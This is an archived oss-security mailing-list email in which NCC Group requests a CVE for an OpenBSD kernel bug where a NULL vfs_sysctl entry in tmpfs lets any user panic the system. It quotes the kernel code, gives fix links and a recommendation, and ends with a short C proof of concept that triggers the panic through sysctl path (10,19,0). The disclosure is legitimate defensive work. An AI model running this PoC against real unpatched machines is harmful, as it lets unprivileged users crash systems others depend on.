X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["5271" "Tuesday" "26" "July" "2016" "14:32:03" "-0400" "Jesse Hertz" "jesse.hertz@nccgroup.trust" "<4CC16782-C45C-496F-BFC3-FE533E54B172@nccgroup.trust>" "145" "[oss-security] CVE Request: Any User Can Panic Kernel Through Sysctl on OpenBSD" "^CC:" nil nil "7" "2016072618:32:03" "[oss-security] CVE Request: Any User Can Panic Kernel Through Sysctl on OpenBSD" (number mark "        jesse.hertz@ Jul 26  145/5271  " thread-indent "\"[oss-security] CVE Request: Any User Can Panic Kernel Through Sysctl on OpenBSD\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 22525 invoked by uid 550); 26 Jul 2016 18:32:23 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 22507 invoked from network); 26 Jul 2016 18:32:22 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=nccgroup.trust; s=dkim20160329; t=1469557930; bh=NAIm75L87ceL1wOn3eOaO+j+eB48FqN9WE9I7Upskjw=; h=From:Content-Type:Subject:Date:Message-ID:CC:To:MIME-Version; b=BD2RjDDi+l+OHBk4IINEo/MVyXQSWlne50OVNEcVTmxR5v1axeQY7lF2cOYVHGbtqWtAI0wMgMxC94XH+SmyiudoJCjMD5uqNKvUo9V8goJ/a+eyKTiyKAGZu4fR8ytg2crqLlCUl31Dq03vfJIM//mGMqXBq72bGd5/MYHMsoQ=
X-MC-Unique: OAUBeZRRPP2dbac7RLWBgQ-1
X-PGP-Universal: processed;
	by man1srvpgp01p.nccgroup.local on Tue, 26 Jul 2016 19:32:06 +0100
X-Pgp-Agent: GPGMail
Content-Type: multipart/signed;
	boundary="Apple-Mail=_944EBA58-0374-46ED-81C1-3585F5075B88";
	protocol="application/pgp-signature"; micalg=pgp-sha512
Message-ID: <4CC16782-C45C-496F-BFC3-FE533E54B172@nccgroup.trust>
MIME-Version: 1.0 (Mac OS X Mail 8.2 \(2104\))
X-Mailer: Apple Mail (2.2104)
X-Originating-IP: [172.20.1.120]
X-ClientProxiedBy: MANCASEXCH01.nccgroup.local (10.1.120.101) To
 MANDBSEXCH03.nccgroup.local (10.1.120.104)
signature: OK
CC: <cve-assign@mitre.org>, Tim Newsham <Tim.Newsham@nccgroup.trust>
Date: Tue, 26 Jul 2016 14:32:03 -0400
From: Jesse Hertz <jesse.hertz@nccgroup.trust>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] CVE Request: Any User Can Panic Kernel Through Sysctl on OpenBSD
To: <oss-security@lists.openwall.com>

--Apple-Mail=_944EBA58-0374-46ED-81C1-3585F5075B88
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain;
	charset=utf-8

As part of NCC Group=E2=80=99s Project Triforce, a generic syscall fuzzing =
effort by
myself and Tim Newsham, a new vulnerability was discovered in the
OpenBSD kernel. It has been fixed now. Please assign a CVE for this issue.

Risk: Medium

Impact:
Any user can panic the kernel by using the sysctl call.  If a
user can manage to map a page at address zero, they may be able
to gain kernel code execution and escalate privileges (OpenBSD fortunately =
prevents this by default).

Description:
When processing sysctl calls, OpenBSD dispatches through a number
of intermediate helper functions.  For example, if the first integer
in the path is 10, sys_sysctl() will call through vfs_sysctl() for
further processing.  vfs_sysctl() performs a table lookup based on
the second byte, and if the byte is 19, it selects the tmpfs_vfsops
table and dispatches further processing through the vfs_sysctl method:

    if (name[0] !=3D VFS_GENERIC) {
        for (vfsp =3D vfsconf; vfsp; vfsp =3D vfsp->vfc_next)
            if (vfsp->vfc_typenum =3D=3D name[0])
                break;

        if (vfsp =3D=3D NULL)
            return (EOPNOTSUPP);

        return ((*vfsp->vfc_vfsops->vfs_sysctl)(&name[1], namelen - 1,
            oldp, oldlenp, newp, newlen, p));
    }

Unfortunately, the definition for tmpfs_vfsops leaves this method NULL:

struct vfsops tmpfs_vfsops =3D {
    tmpfs_mount,            /* vfs_mount */
    tmpfs_start,            /* vfs_start */
    tmpfs_unmount,          /* vfs_unmount */
    tmpfs_root,         /* vfs_root */
    (void *)eopnotsupp,     /* vfs_quotactl */
    tmpfs_statfs,           /* vfs_statfs */
    tmpfs_sync,         /* vfs_sync */
    tmpfs_vget,         /* vfs_vget */
    tmpfs_fhtovp,           /* vfs_fhtovp */
    tmpfs_vptofh,           /* vfs_vptofh */
    tmpfs_init,         /* vfs_init */
    NULL,               /* vfs_sysctl */
    (void *)eopnotsupp,
};

Trying to read or write a sysctl path starting with (10,19) results
in a NULL pointer access and a panic of
"attempt to execute user address 0x0 in supervisor mode".
Since any user can perform a sysctl read, this issue can be abused
by any logged in user to panic the system.

Fortunately, OpenBSD intentionally prevents users from attempting to map a =
page
at the NULL address.  If an attacker is able to get such a mapping,
they may be able to cause the kernel to jump to code mapped at this
address (if other security protections such as SMAP/SMEP aren't in place).
This would allow an attacker to gain kernel code execution and
escalate their privileges.

Reproduction:
Run the PoC sysctl_tmpfs_panic.c program. It will pccess
the (10,19,0) sysctl path and trigger a panic of
"attempt to execute user address 0x0 in supervisor mode".
NCC Group was able to reproduce this issue on OpenBSD 5.9 release
running amd64.

Recommendation:
Include a NULL-pointer check in vfs_sysctl() before dispatching to
the vfs_sysctl method.  Alternately, include a vfs_sysctl method
in the tmpfs_vfsops table.

Reported: 2016-07-21
Fixed: http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/sys/kern/vfs_subr.c.dif=
f?r1=3D1.248&r2=3D1.249
          http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/sys/tmpfs/tmpfs_vfso=
ps.c.diff?r1=3D1.9&r2=3D1.10
Assigned CVE: TBD

PoC:

// @author newsh

#include <stdio.h>
#include <sys/param.h>
#include <sys/sysctl.h>

int main(int argc, char **argv)
{
    int name[] =3D { 10, 19, 0 }; // vfs.tmpfs.0
    char buf[16];
    size_t sz =3D sizeof buf;
    int x;

    x =3D sysctl(name, 3, buf, &sz, 0, 0);
    if(x =3D=3D -1) perror("sysctl");
    printf("no crash!\n");
    return 0;
}


########

About NCC:
NCC Group is a security consulting company that performs all manner of
security testing and has a strong desire to help make the industry a
better, more resilient place. Because of this, when NCC Group
identifies vulnerabilities in a system they prefer to work closely with
vendors to create more secure systems. NCC Group strongly believes in
responsible disclosure, and has strict guidelines in place to ensure
that proper disclosure procedure is followed at all times. This serves
the dual purpose of allowing the vendor to safely secure the product or
system in question as well as allowing NCC Group to share cutting edge
research or advisories with the security community.

--Apple-Mail=_944EBA58-0374-46ED-81C1-3585F5075B88
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="signature.asc"
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: Message signed with OpenPGP using GPGMail

-----BEGIN PGP SIGNATURE-----
Comment: GPGTools - https://gpgtools.org

iQEcBAEBCgAGBQJXl6yjAAoJEPhkPVYKhDWbSKAH/Agts25hwdbBz5U/FCn0bqvx
RbC0DwzWZ8XxL16M7MTp6IDBcv8Tv6ld8X8puAUmYXe8EVSSF0qw71ba3WHmeT+Q
XUowUCSye0DrQ162wKZnd1ZyrdfZpbb++lwLZonS2bnD1n+9t393ZqlTNox+pROG
UinOPOKft0dbvhYeWBw1pr04NOUv7sgYL3ARWoisizuuyj9C7FVhE1X07Hq96XFq
5UXq+b9o6FdC3BxEk9qVqP5GW1N6weSI4zQu1ztez2N00e3WPy7nT1VzdDATmBzh
yN5OaLo9ENWVpEtORd4baqNceQQLugnX/tpvd+sy1qanjqpYE585CpnmhfvFY5k=
=2oy2
-----END PGP SIGNATURE-----

--Apple-Mail=_944EBA58-0374-46ED-81C1-3585F5075B88--

